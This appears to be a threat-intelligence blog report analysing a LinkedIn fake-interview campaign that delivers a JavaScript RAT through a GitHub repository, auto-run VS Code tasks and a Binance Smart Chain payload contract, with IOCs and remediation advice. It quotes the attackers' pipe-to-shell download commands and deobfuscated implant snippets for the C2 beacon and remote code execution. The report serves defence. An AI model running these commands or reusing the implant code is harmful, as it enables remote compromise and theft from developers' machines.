---
title: "Interview Trap: Blockchain-Staged JavaScript RAT Delivered via LinkedIn"
date: 2026-02-24
author: "ThreatProphet"
description: "Analysis of a sophisticated fake recruiter campaign delivering a JavaScript RAT via LinkedIn, with payload staging through a Binance Smart Chain smart contract."
tags:
  - lazarus-group
  - contagious-interview
  - javascript
  - rat
  - linkedin-lure
  - blockchain
  - binance-smart-chain
  - node-js
  - vscode
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1059.007
  - T1071.001
  - T1027
  - T1102
report_id: "TP-2026-001"
showToc: true
---

> *"The snare is laid in secret; the prey walks toward it of his own will."*

## Executive Summary

A threat actor, operating a fake recruiter persona on LinkedIn, targeted developers by asking them to complete a “technical assessment” that required cloning and running a malicious GitHub repository named **Tech-Core**. The repository contained a multi-stage malware implant designed to execute silently on open in Visual Studio Code, or when common npm commands are run.

The technically distinctive element of this campaign is its payload staging mechanism: malicious JavaScript is not stored in the repository itself but is retrieved at runtime from a smart contract deployed on the **Binance Smart Chain (BSC)**. The contract's `getMemo()` function returns obfuscated JavaScript which is executed dynamically via Node.js's `Function` constructor, granting the implant full system access.

Once active, the implant beacons to a hardcoded C2 server every 5 seconds, transmitting host profiling data. The C2 can respond with an arbitrary second-stage payload, providing full remote code execution on the victim machine.

A cluster of related repositories was identified sharing the same execution mechanism, overlapping infrastructure, and common Git author identities - indicating an organized, ongoing campaign targeting developers through fake job opportunities. Investigation identified a further repository, **Softstack-Platform-MVP2** (GitHub org: Softstack-Hub5), as a direct rebrand of Tech-Core using identical malware files and the same BSC payload contract. The Softstack-Hub5 organisation impersonates real German company SOFTSTACK GmbH, and the existence of a pre-staged `Softstack-Hub4` account with no repositories indicates systematic persona preparation. TTPs are consistent with **Lazarus Group / Contagious Interview** campaigns documented by Palo Alto Unit42 and others, though attribution is assessed at **low-to-medium confidence** based on TTP similarity alone.

---

## Attack Overview

### Initial Contact

A LinkedIn recruiter persona was used to initiate contact and present a developer hiring pretext. The workflow directed the target to complete a “technical assessment” that consisted of cloning and executing a GitHub repository. This delivery pattern, fake technical interviews distributed via LinkedIn, is a defining characteristic of activity reported under the Contagious Interview and Operation Dream Job monikers, associated with Lazarus Group developer-targeting campaigns since at least 2020.

### Repository Cluster

The primary lure repository was **Tech-Core**. Investigation revealed a broader cluster of interconnected repositories sharing the same malicious execution mechanism:

| Repository | GitHub Account | Notes |
|---|---|---|
| Tech-Core | LuckyKat1001 | Primary lure repository |
| NeonVerse | LuckyKat1001 | Earlier variant, used Polygon contracts |
| PixelVerse | LuckyKat1001 | Structural match |
| SpreadChain | LuckyKat1001 | Shared Git author identity |
| Modex | LuckyKat1001 | Shared execution mechanism |
| Softstack-Platform-MVP2 | Softstack-Hub5 | Rebrand, identical malware and BSC contract, impersonates real company SOFTSTACK GmbH |

### Kill Chain

1. Victim opens the Tech-Core repository in VS Code. Tasks configured with `runOn: folderOpen` trigger automatically without user interaction.
2. VS Code tasks silently execute an OS-specific pipe-to-shell command against a Vercel-hosted endpoint, fetching and executing a first-stage shell script. Output is suppressed via `reveal: silent`, `close: true`, `echo: false`.
3. Separately, running any common npm command (`npm start`, `npm test`, `npm run build`, `npm run prepare`) executes `node server/server.js`, triggering `configureCollection()` on startup.
4. `configureCollection()` calls the BSC smart contract's `getMemo()` function over JSON-RPC, retrieving concatenated segments of obfuscated JavaScript.
5. The retrieved payload is executed via `new Function('require', payload)(require)`, injecting Node's `require` to enable full filesystem and network access.
6. The implant profiles the host (hostname, MAC addresses, OS) and beacons to C2 every 5 seconds.
7. If C2 responds with `status === 'error'`, the response body is executed as a further JavaScript stage - arbitrary remote code execution.

---

## Technical Analysis

### Stage 1: VS Code Task Auto-Execution

The repository includes a `.vscode/tasks.json` configuring two malicious tasks. The key property `runOptions.runOn: "folderOpen"` causes execution automatically on folder open - no user interaction required beyond opening the project.

The task implements a cross-platform pipe-to-shell RCE primitive:

```bash
# macOS
curl <vercel_url>/api/settings/mac | bash

# Linux
wget -qO- <vercel_url>/api/settings/linux | sh

# Windows
curl <vercel_url>/api/settings/win | cmd
```

Three Vercel domains were observed across different commits, indicating active infrastructure rotation to evade takedowns:

| Domain | Status |
|---|---|
| vscodesettingtask.vercel[.]app | Inactive |
| vscodesetting-task.vercel[.]app | Inactive |
| vscode-settings-tasks-json.vercel[.]app | Inactive at time of analysis |
| vscode-ipchecking.vercel[.]app | **Active at time of analysis** - updated infrastructure |

### Stage 1b: Updated Delivery Infrastructure (Active at Time of Analysis)

Prior to the Tech-Core repository going offline, the VS Code tasks were updated to point to a new Vercel domain: `vscode-ipchecking.vercel[.]app`. Unlike the previously documented domains, this endpoint was **still active** at the time of retrieval, allowing the full Stage 1 delivery chain to be captured.

The updated delivery has evolved from a single pipe-to-shell command into a two-stage shell execution chain.

**Stage 1a - Loader (`/api/settings/linux`)**

A minimal bash script that prints `Authenticated` (social engineering misdirection), creates `$HOME/.vscode/`, downloads the bootstrap script, and executes it silently via `nohup`. The `echo "Authenticated"` output is visible to the victim in the VS Code terminal - a deliberate attempt to make the task appear legitimate.

**Stage 1b - Bootstrap (`/api/settings/bootstraplinux`)**

A significantly more sophisticated script that silently: checks for an existing Node.js installation and if absent downloads a portable Node.js binary from `nodejs.org` into `$HOME/.vscode/`; records the name of the currently open VS Code folder to `$HOME/.vscode/<foldername>.txt` (victim workspace fingerprinting); downloads `env-setup.js` (the C2 implant) and `package.json` from the same Vercel endpoint; runs `npm install` to pull dependencies (`axios`, `request`); then executes `env-setup.js` via Node.js.

This bootstrap ensures execution succeeds even on systems without Node.js pre-installed, significantly broadening the potential victim pool beyond developers with an existing Node environment.

**Stage 1c - C2 Implant (`/api/settings/env`)**

The retrieved `env-setup.js` is functionally identical to the on-chain payload previously documented - same string-shuffling obfuscation, same C2 endpoint (`163.245.194[.]216:3000`), same `new Function('require', payload)(require)` execution primitive. The embedded campaign identifier in this variant is `env991228`, retaining the `1228` suffix observed in the earlier `exceptionId=1228` beacon parameter.

**Stage 1d - Package manifest (`/api/settings/package`)**

A minimal `package.json` pulling `axios ^1.10.0` and `request ^2.88.2`, with a start script pointing to `env.npl` - consistent with InvisibleFerret-style naming conventions documented in prior Contagious Interview reporting.

This two-stage delivery represents an operational improvement over the single pipe-to-shell approach: more resilient, handles missing dependencies, and reduces the chance of noisy failures that might alert the victim.

### Stage 2: On-Chain Payload Staging

The most technically distinctive element of this campaign is the use of a blockchain smart contract as an off-repository payload store. The logic in `server/controllers/collection.js`:

1. Connects to BSC JSON-RPC via `ethers.providers.JsonRpcProvider(RPC_URL)`
2. Instantiates the smart contract with ABI: `getMemo() → string`
3. Calls `contract.getMemo()` - returns segments of obfuscated JavaScript
4. Concatenates returned strings to reconstruct the full payload
5. Executes: `new Function('require', payload)(require)`

This mechanism is significant from a detection standpoint: the malicious payload never exists in the repository, on disk, or in any scannable form prior to execution. It lives entirely on-chain, outside the reach of repository scanners, antivirus, and most static analysis tooling.

The BSC contract used by Tech-Core:
```
0xE251b37Bac8D85984d96da55dc977A609716EBDc
```

An earlier NeonVerse variant used two Polygon contracts:
```
0xad031E8d8877481337cD53E141C16A2201BB6F4d
0xa80db78ff597c3D34cCAF3bdaC39f3E193595561
```

### Stage 3: Payload Analysis (Deobfuscated)

The on-chain payload was retrieved from BSC contract `0xE251b37B` on 2026-02-21 and deobfuscated. The payload uses a string-shuffling obfuscation technique characteristic of `javascript-obfuscator` tooling - a large string array is populated with encoded fragments, and a numeric-key decode function reconstructs identifiers at runtime. This technique is consistent with previously documented Lazarus Group / Contagious Interview implants.

**Dependency Setup**
```javascript
const axios = require('axios');
const os    = require('os');
let instanceId = 0;
```

Only `axios` and `os` are required - both standard Node.js packages present in virtually any Node project, making the implant invisible to `package.json` audits.

**Host Profiling**
```javascript
hostname : os.hostname()
macs     : Object.values(os.networkInterfaces())
             .flat().filter(Boolean)
             .map(i => i.mac)
             .filter(m => m && m !== '00:00:00:00:00:00')
os       : os.type() + os.release() + '(' + os.platform() + ')'
```

MAC address filtering explicitly removes the loopback address, ensuring only real physical interfaces are reported - a deliberate fingerprinting choice to uniquely identify the victim across sessions.

**C2 Beacon**
```javascript
await axios.get(
  'http://163.245.194.216:3000/api/err/error',
  { params: { sysInfo, exceptionId: '1228', instanceId } }
)
```

The beacon URL is assembled at runtime from string array fragments to resist static string scanning. `exceptionId: 1228` is a hardcoded campaign identifier. `instanceId` begins at 0 and updates with each C2 response, functioning as a session token.

**Server-Driven Code Execution**
```javascript
if (response.data.status === 'error') {
  new Function('require', response.data.message)(require)
}
```

If C2 responds with `status: 'error'`, the message field is compiled and executed as a new JavaScript function with full `require` access. This is a fully general arbitrary code execution primitive. The use of `'error'` as the execution trigger is deliberate misdirection - error-handling code paths receive less scrutiny during code review.

The implant beacons immediately on load, then every 5 seconds indefinitely. An anti-debug wrapper is included to prevent debugger attachment and function serialization inspection.

### Credential Staging

Earlier commits in Tech-Core include a `.env` variable `AUTH_API` containing a Base64-encoded URL:

```
AUTH_API=aHR0cHM6Ly9hdXRoLXB1Y2UtdGF1LnZlcmNlbC5hcHAvYXBp
Decoded: https://auth-puce-tau.vercel.app/api  [inactive at time of analysis]
```

Paired code in `server/routes/api/auth.js` decoded this value at runtime via `atob(process.env.AUTH_API)`, suggesting an earlier delivery stage for credential harvesting or auth-related payload staging.

### Confirmed Threat Actor GitHub Identity

The fork at `github.com/Sergiy-Sa/Tech-Core` was explicitly forked from `LuckyKat1001/Tech-Core`, confirming that `LuckyKat1001` is the canonical owner and operator of the primary malicious repository. This directly corroborates the Git author metadata (`LuckyKat1001 / brajan.intro@gmail.com`) observed in the commit history.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment lure |
| T1059.007 | JavaScript | Execution | Node.js Function constructor execution |
| T1071.001 | Web Protocols | Command & Control | Plain HTTP beacon every 5 seconds |
| T1027 | Obfuscated Files or Information | Defense Evasion | String-shuffling JS obfuscation |
| T1102 | Web Service | Defense Evasion | Blockchain smart contract as payload store |
| T1204.002 | Malicious File | Execution | User opens repository in VS Code |
| T1033 | System Owner/User Discovery | Discovery | Hostname, OS, MAC address profiling |
| T1016 | System Network Configuration Discovery | Discovery | MAC address enumeration |

---

## Infrastructure Analysis

### Network Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| 163.245.194[.]216 | IPv4 | C2 server, TCP/3000 |
| 163.245.194[.]216:3000/api/err/error | URL | Beacon endpoint |
| vscodesettingtask.vercel[.]app | Domain | Stage 1 delivery, inactive |
| vscodesetting-task.vercel[.]app | Domain | Stage 1 delivery, rotated, inactive |
| vscode-settings-tasks-json.vercel[.]app | Domain | Stage 1 delivery, inactive at analysis |
| auth-puce-tau.vercel[.]app | Domain | Credential staging, inactive |
| vscode-ipchecking.vercel[.]app | Domain | Updated Stage 1 delivery, active at time of analysis |

**C2 IP Attribution:**

| Field | Value |
|---|---|
| Hosting Provider | Interserver, Inc |
| Network Name | INTER-83 |
| Entity | NOC1390-ARIN |

### Blockchain Infrastructure

| Address | Chain | Role |
|---|---|---|
| 0xE251b37Bac8D85984d96da55dc977A609716EBDc | BSC | Payload staging contract (Tech-Core) |
| 0xad031E8d8877481337cD53E141C16A2201BB6F4d | Polygon | Payload staging contract (NeonVerse, earlier) |
| 0xa80db78ff597c3D34cCAF3bdaC39f3E193595561 | Polygon | Payload staging contract (NeonVerse, earlier) |

---

## Indicators of Compromise

> All indicators assessed **High confidence** unless noted.

### Network Indicators

| Indicator | Type | Confidence |
|---|---|---|
| 163.245.194[.]216 | IPv4 | High |
| 163.245.194[.]216:3000 | IP:Port | High |
| /api/err/error?exceptionId=1228 | URL pattern | High |
| vscodesettingtask.vercel[.]app | Domain | High |
| vscodesetting-task.vercel[.]app | Domain | High |
| vscode-settings-tasks-json.vercel[.]app | Domain | High |
| auth-puce-tau.vercel[.]app | Domain | Medium |
| vscode-ipchecking.vercel[.]app | Domain | High |
| vscode-ipchecking.vercel[.]app/api/settings/linux | URL | High |
| vscode-ipchecking.vercel[.]app/api/settings/bootstraplinux | URL | High |
| vscode-ipchecking.vercel[.]app/api/settings/env | URL | High |
| vscode-ipchecking.vercel[.]app/api/settings/package | URL | High |

### Blockchain Indicators

| Address | Chain | Confidence |
|---|---|---|
| 0xE251b37Bac8D85984d96da55dc977A609716EBDc | BSC | High |
| 0xad031E8d8877481337cD53E141C16A2201BB6F4d | Polygon | High |
| 0xa80db78ff597c3D34cCAF3bdaC39f3E193595561 | Polygon | High |

### Repository & Code Indicators

| Indicator | Type | Notes |
|---|---|---|
| github.com/LuckyKat1001/Tech-Core | Repository | Primary malicious repository |
| github.com/Sergiy-Sa/Tech-Core | Repository | Confirmed fork of above |
| github.com/Softstack-Hub5/Softstack-Platform-MVP2 | Repository | Rebrand of Tech-Core, identical malware |
| LuckyKat1001 | GitHub account | Operator - Tech-Core cluster |
| brajan.intro@gmail.com | Email | Git author identity - Tech-Core cluster |
| Softstack-Hub5 | GitHub organisation | Operator - Softstack rebrand, impersonates SOFTSTACK GmbH |
| Softstack-Hub4 | GitHub organisation | Pre-staged account, no public repositories |
| CodeBlock110 | GitHub account | Committer - Softstack-Platform-MVP2 |
| stevejame329+1@gmail.com | Email | Git author identity - Softstack cluster |
| `runOn: folderOpen` in `.vscode/tasks.json` | Code pattern | Auto-execution trigger |
| `new Function('require', payload)(require)` | Code pattern | Dynamic execution primitive |
| `exceptionId=1228` | Campaign ID | Hardcoded beacon parameter |

### Payload File Hashes

| Hash (SHA256) | Description |
|---|---|
| `30d3b0536692d1c9455921ff97e4adfef1f463a26f3043c302f950c010911f66` | getMemo raw hex payload, retrieved from BSC contract 0xE251b37B on 2026-02-21 |
| `5cde597193dd137e09b1d53e6869ee8d5930bd36d5992705b036acc435b2a38e` | getMemo decoded payload, retrieved from BSC contract 0xE251b37B on 2026-02-21 |
| `9f8c712f1364a87e1b4677395e2a2c8849c63526611a4665d197348c50f47818` | collection.js - blockchain staging component (Tech-Core HEAD) |
| `ceff282f32aae9ce3dea6a9b00212e6de90669646180cb5e5bb6bf5353527bbd` | tasks.json - VS Code auto-execution config (Tech-Core HEAD) |
| `95bc7ce3500278ff3e092c13e25675ea297301c54917a92b38ba4b10d471269f` | server.js - main implant entry point (Tech-Core HEAD) |
| `89b2ecf801d5c93c71a8a7f01e3a3ee37f45590e14e035741bd1a8a5f4c33ded` | Stage 1a loader script (`/api/settings/linux`), retrieved from vscode-ipchecking.vercel[.]app |
| `85dcf1705064dcd13e6d1b95b5c1e9f62f269887410385a474a462426d9e9384` | Stage 1b bootstrap script (`/api/settings/bootstraplinux`), retrieved from vscode-ipchecking.vercel[.]app |
| `e1790a08ebf0402d49e826b6f773b3b6e55f3cb5a755bc2067dda2a0c2737503` | Stage 1c C2 implant env-setup.js (`/api/settings/env`), retrieved from vscode-ipchecking.vercel[.]app |
| `6effad9fdee81589b37c60bbbae20483200bf53bee3e3c107b1aa47d2ac4ccb3` | Stage 1d package.json (`/api/settings/package`), retrieved from vscode-ipchecking.vercel[.]app |
| `a7cd162c691ad71a4c0c5955765d8f7a60d8b7b9a92b277b1ae74b280644cdf8` | tasks.json - VS Code auto-execution config (Softstack-Platform-MVP2) |
| `2f65e39dcbcb028da4bf4da43f3a1db7e5f9fff2dfd57ad1a5abd85d7950f365` | package.json (Softstack-Platform-MVP2) |
| `6e04b6337480ca0395b28c78ce9a7066ce345f4b87f7b844a0414a4dfffcf5f9` | .env (Softstack-Platform-MVP2) - identical to Tech-Core, confirms shared BSC contract address |

---

## Campaign Expansion and Rebrand

Post-publication investigation identified a further repository continuing the same campaign under a new identity: **Softstack-Platform-MVP2**, hosted under GitHub organisation **Softstack-Hub5**.

### Softstack-Hub5 / Softstack-Platform-MVP2

The repository was last updated on 2026-02-23 (two days prior to this report). Forensic comparison confirms it is a direct rebrand of Tech-Core rather than a new implementation:

- `collection.js` SHA256: `9f8c712f...` - identical to Tech-Core
- `server.js` SHA256: `95bc7ce3...` - identical to Tech-Core
- `.env` SHA256: `6e04b633...` - identical to Tech-Core
- `NFT_CONTRACT_ADDRESS=0xE251b37Bac8D85984d96da55dc977A609716EBDc` - same BSC payload contract
- `tasks.json` points to `vscode-ipchecking.vercel.app` - same active delivery domain

The Git author identity differs from Tech-Core: `CodeBlock110 / stevejame329+1@gmail.com`. The `+1` suffix suggests a numbered variant of a base Gmail identity (`stevejame329@gmail.com`), consistent with an operator maintaining multiple accounts.

### Impersonation of SOFTSTACK GmbH

The GitHub organisation name `Softstack-Hub5` impersonates **SOFTSTACK GmbH**, a legitimate German Web3 company (softstack.io, registered 2019, Flensburg, Schleswig-Holstein). The real company has no apparent connection to this repository. The `Hub5` suffix in the organisation name is operationally significant: a search of GitHub confirms `Softstack-Hub4` also exists with no public repositories, indicating sequential account pre-staging. Accounts are likely created in advance and activated as needed, with earlier accounts either exhausted or held in reserve.

This pattern - multiple numbered personas, impersonation of legitimate companies, identical underlying malware - indicates a systematic, organised campaign rather than isolated incidents.

---

## Attribution Assessment

**Assessed confidence: Low-to-Medium**

Several aspects of this campaign are consistent with documented Lazarus Group (DPRK) developer-lure operations:

- LinkedIn-based recruitment lure targeting developers - a defining characteristic of Lazarus Group campaigns active since at least 2020
- Fake technical interview with a GitHub-hosted malicious repository - matches the Contagious Interview modus operandi documented by Palo Alto Unit42
- NFT/DeFi/Web3 project theming - consistent with Lazarus Group's known focus on cryptocurrency-related targets
- Blockchain smart contract as payload staging - this specific technique has been previously documented in campaigns linked to Lazarus Group / TraderTraitor
- Cross-platform execution targeting macOS, Linux, and Windows - consistent with Lazarus Group's known tooling breadth

These similarities do not constitute confirmed attribution. The techniques described are sophisticated and could be replicated by other threat actors familiar with Lazarus TTPs. Attribution should not be asserted without additional corroborating intelligence.

**Prior reporting:**
- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [CISA - TraderTraitor](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)

---

## Remediation

### If You Ran the Repository

- Isolate the affected machine from the network immediately
- Preserve forensic evidence before remediation: memory dump, system logs, shell history
- Rotate all credentials accessible from the machine: SSH keys, API tokens, cloud credentials, cryptocurrency wallet seeds, browser-stored passwords
- Audit for persistence: scheduled tasks, cron jobs, registry Run keys, Launch Agents (macOS)
- Do not rely exclusively on AV/EDR - the payload executes as JavaScript within a legitimate Node.js process and may not be flagged
- If compromise is confirmed, reimage from a known-good backup or clean OS install

### Network-Level Detection

- Block and alert on outbound connections to `163.245.194[.]216` (all ports, especially TCP/3000)
- Create IDS/IPS rules for HTTP GET requests to `/api/err/error` containing `exceptionId=1228`
- Monitor for outbound HTTP (not HTTPS) connections from Node.js processes on non-standard ports
- Flag DNS queries or HTTP connections to `*.vercel.app` from developer workstations where no legitimate Vercel usage is expected, particularly paths matching `/api/settings/{mac,linux,win}`

### Host-Level Hardening

- Disable VS Code automatic task execution: set `task.allowAutomaticTasks` to `off` or `prompt` in VS Code settings
- Review all `.vscode/tasks.json` files before opening unknown repositories - specifically tasks with `runOn: folderOpen` or pipe-to-shell commands
- Run developer assessments from unknown sources in an isolated VM or container with filtered network egress and ephemeral storage
- Audit `postinstall` and `prepare` scripts before running `npm install` in unknown projects

---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-001 | Published: 2026-02-24 | Author: [ThreatProphet](https://threatprophet.com)*
